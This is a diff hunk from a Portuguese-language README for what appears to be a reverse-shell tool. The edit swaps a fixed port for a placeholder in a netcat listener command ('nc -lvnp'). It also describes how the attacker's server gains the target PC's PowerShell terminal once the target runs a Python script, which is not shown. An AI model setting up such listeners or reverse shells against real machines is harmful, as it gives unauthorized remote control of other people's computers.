@@ -12,7 +12,7 @@ Este projeto cria uma conexão de shell reversa entre um alvo e um servidor, per
 2. **Configuração do `Netcat`:**
    - O servidor deve executar o seguinte comando no terminal para escutar a porta:
    ```bash
-   stty raw -echo; (stty size; cat) | nc -lvnp 28125 -s 0.0.0.0
+   stty raw -echo; (stty size; cat) | nc -lvnp {PORTA} -s 0.0.0.0
 
 3. **Máquina Alvo:**
    - Uma vez que o servidor está escutando a porta escolhida, é hora da máquina alvo executar o código Python. Uma vez que isso for feito, o servidor terá acesso ao terminal do powershell do PC alvo.
